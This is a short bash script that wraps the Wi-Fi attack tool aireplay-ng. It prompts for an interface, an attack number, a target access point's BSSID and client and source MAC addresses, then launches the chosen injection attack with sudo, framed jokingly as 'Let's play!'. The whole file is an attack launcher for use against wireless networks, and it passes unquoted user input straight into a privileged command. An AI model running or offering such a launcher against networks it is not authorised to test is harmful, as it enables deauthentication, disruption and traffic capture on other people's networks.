#!/bin/bash

echo "Let's play!: "

echo "Select Wireless Interface: "
read INTERFACE

echo "Select Attack(0-9): "
read ATTACK

echo "Attack Options: "
read TargetOPTIONS

echo "Target BSSID(prepend '-a' or '-b'): "
read TargetBSSID

echo "Target Destination MAC (-c) - leave blank to omit: "
read TargetDESTINATION

echo "(optional) Target Source MAC (-h) - leave blank to use your current MAC Address: "
read TargetSOURCE

echo "(optional) Save to (prepend '-w') : "
read SAVETO

sudo aireplay-ng -$ATTACK $TargetOPTIONS $TargetBSSID $TargetDESTINATION $TargetSOURCE $INTERFACE $SAVETO
echo "play nice now...: "
